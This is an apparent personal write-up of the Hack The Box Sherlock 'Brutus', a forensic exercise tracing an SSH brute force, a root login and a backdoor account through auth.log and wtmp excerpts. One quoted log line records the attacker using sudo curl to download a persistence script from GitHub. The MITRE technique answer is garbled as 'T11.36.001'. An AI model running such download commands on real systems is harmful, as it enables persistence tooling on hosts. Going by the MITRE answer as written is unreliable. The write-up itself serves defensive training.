---
title: Brutus
aliases:
  - Brutus
tags:
  - VeryEasy
  - HTB
  - Sherlock
---
# Introduction
---
In this very easy Sherlock, you will familiarize yourself with Unix **auth.log** and **wtmp logs**. We'll explore a scenario where a Confluence server was **brute-forced** via its **SSH service**. After gaining access to the server, the attacker performed additional activities, which we can track using **auth.log**. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

---

![[images/Pasted image 20250416152753.png]]
```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
```
>[!Question 1]
>**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
>
>**Ans.** 65.2.161.68


![[images/Pasted image 20250416153047.png]]
```
Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
>[!Question 2]
>**The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
>
>**Ans.** root


![[images/Pasted image 20250416153501.png]]
```
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
```
>[!Question 3]
>**Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
>
>**Ans.** 2024-03-06 06:32:45

![[images/Pasted image 20250416153624.png]]
```
ar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
```
>[!Question 4]
>**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
>**Ans.** 37


![[images/Pasted image 20250416153917.png]]
```
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
```
>[!Question 5]
>**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
>
>**Ans.** cyberjunkie

![[images/Pasted image 20250416154203.png]]
>[!Question 6]
>**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
>
>**Ans.** T11.36.001

![[images/Pasted image 20250420173405.png]]
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
```
>[!Question 7]
>**What time did the attacker's first SSH session end according to auth.log?**
>
>**Ans.** 2024-03-06 06:37:24


![[images/Pasted image 20250416154930.png]]
```
voldemort@IdeaPad:~/Downloads/Brutus$ grep 'http' auth.log 
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
>[!Question 8]
>**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
>
>**Ans.** /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
